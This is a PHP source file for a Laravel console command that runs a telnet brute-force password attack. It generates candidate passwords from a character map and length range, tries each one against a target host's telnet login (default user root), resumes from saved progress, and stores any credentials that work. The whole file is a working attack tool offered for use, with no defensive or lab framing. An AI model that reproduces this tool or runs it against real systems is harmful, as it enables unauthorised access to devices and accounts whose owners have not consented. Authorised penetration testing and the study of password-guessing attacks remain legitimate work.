<?php

namespace Ycoya\LaravelTelnetBruteForce\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Storage;
use Ycoya\LaravelTelnetBruteForce\Telnet\TelnetService;
use yidas\BruteForceAttacker;

class TelnetBruteForcePasswordGenerated extends Command
{
    /**
     * Telnet brute force attack password generated
     *
     * string $host Host name or IP address
     * int $port TCP port number
     * string user username for the password generated
     * int min the first length used to generated password
     * int max the last length used to generate password, min and max create a range of length for passwords
     *         ex:min=2 max=3. It will generate password of length 2, when all combinations are generated it continues to 3 password length.
     * string char_map_path holds the path of the file that contains the chars used to generate password. It should be an array json_encoded ex:["A","B","C","D"]
     * float $connect_timeout the timeout for connecting to the host
     * string $prompt the default prompt
     * float $socket_timeout the timeout to wait for new data
     * float|null $full_line_timeout The maximum time to wait for before assuming the line is not carriage return terminated. null for infinity
     * boolean debug to output more information in laravel.log
     * boolean reset to reset the saved values. Restart from the first password again.
     * string tag If more than one instance is running, it use the tag as part of the filename to save the progress.
     *
     * @var string
     */
    protected $signature = 'telnet:attack-gp {--host=127.0.0.1} {--port=23} {--user=root} 
    {--min=1 : minimum length to generate password strings.}
    {--max=2 : maximum length to generate password strings.} 
    {--m|char_map_path= : Path to file which contains chars to use for generating password.}
    {--connect_timeout=1.0 : the timeout for connecting to the host.} 
    {--socket_timeout=10.0 : the timeout to wait for new data.}
    {--full_line_timeout=0.10 : The maximum time to wait for before assuming the line is not carriage return terminated.}
    {--debug : output more information in laravel.log. }
    {--reset : reset the saved values. Restart from the first username and password again.}
    {--resetFound : reset only the username and password saved previously identified as correct by the program.. It does not reset the progress saved for password generated.}
    {--tag=0 : If more than one instance is running, different files saved ex: 0_count.txt, 1_count.txt}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command to do a telnet brute force by using an internal password generated.';

    private $found = false;

    private $count = 0;

    private $passGeneratedSavedPath;

    private $countSavedPath;

    /**
     * To saved the record when password was found.
     * string $passwordFoundPath
     */
    private $passwordFoundPath;

    /**
     * @var TelnetService
     */
    protected $telnet;

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $tag  = $this->option('tag');
        $host = $this->option('host');

        $this->passGeneratedSavedPath = "telnet_brute_force_gp/$host/${tag}_password.txt";
        $this->countSavedPath = "telnet_brute_force_gp/$host/{$tag}_count.txt";
        $this->passwordFoundPath     = "telnet_brute_force_gp/$host/{$tag}_password_found.txt";

        if($this->option('resetFound')) {
            Storage::delete($this->passwordFoundPath);
        }

        $passwordFound = Storage::get($this->passwordFoundPath);
        if(!is_null($passwordFound)) {
            $this->info("credentials found: $passwordFound");
            return Command::SUCCESS;
        }

        $username          = $this->option('user');
        $minLengthPassword = $this->option('min');
        $maxLengthPassword = $this->option('max');

        if($minLengthPassword > $maxLengthPassword) {
            $this->error("Option --min=$minLengthPassword could not be greater than --max=$maxLengthPassword");
            return Command::FAILURE;
        }

        if(!$this->option('socket_timeout')) {
            $this->error("You must enter a positive float number or integer");
            return Command::FAILURE;
        }

        $charMap = $this->option('char_map_path');
        if($charMap) {
            $charMap = json_decode(Storage::disk('ycoyaTelnetBruteForceDisk')->get($charMap) ?? Storage::get($charMap) ?? false);
        }

        $options = Arr::only($this->options(), ['host', 'port', 'host', 'connect_timeout', 'socket_timeout', 'full_line_timeout']);

        $this->telnet = new TelnetService(...$options);
        $this->telnet->setInfoLogCallback([$this, 'info']);
        $this->telnet->setQuestionLogCallback([$this, 'question']);
        $this->telnet->setErrorLogCallback([$this, 'error']);
        if($this->option('debug')) {
            $this->telnet->getTelnetCore()->setDebugThis(true);
        }
        $this->telnet->setUsername($username);

        $charRecorded = Storage::get($this->passGeneratedSavedPath);
        $this->count  = Storage::get($this->countSavedPath) ?? 1;

        if($this->option('reset')) {
            $charRecorded = null;
            $this->count = 1;
        }

        if(!is_null($charRecorded)) {
            $this->info("Password generated saved previously found using: $charRecorded.");
        }

        if($this->count != 1) {
            $this->info("Password count saved previously found using: $this->count.");
        }

        $minLengthPassword = $charRecorded ? strlen($charRecorded): $minLengthPassword;

        if($minLengthPassword > $maxLengthPassword) {
            $this->error("The password length for $charRecorded ($minLengthPassword)  could not be greater than --max=$maxLengthPassword set in option.");
            return Command::FAILURE;
        }

        BruteForceAttacker::startFrom($charRecorded);
        for ($i = $minLengthPassword ; $i <= $maxLengthPassword ;$i++) {
            BruteForceAttacker::run([
                'length' => $i,
                'charMap' => $charMap ?: array_merge(range('A', 'Z'), range('a', 'z'), range('0', '9')),
                'callback' => [$this, 'sendTelnetCmd'],
                'startCount' => $this->count,
            ]);
            if($this->found) {
                break;
            }
        }
        return Command::SUCCESS;
    }

    public function sendTelnetCmd($password, $count)
    {
        $this->count = $count;
        Storage::put($this->countSavedPath, $count);
        Storage::put($this->passGeneratedSavedPath, $password);
        if ($this->telnet->bruteForceWithPasswordGenerated($password, $count)) {
            $this->info( "Found {$password},  {$count} times");
            $username = $this->telnet->getUsername();
            Storage::put($this->passwordFoundPath, "$username:$password");
            return $this->found = true;
        }
    }
}
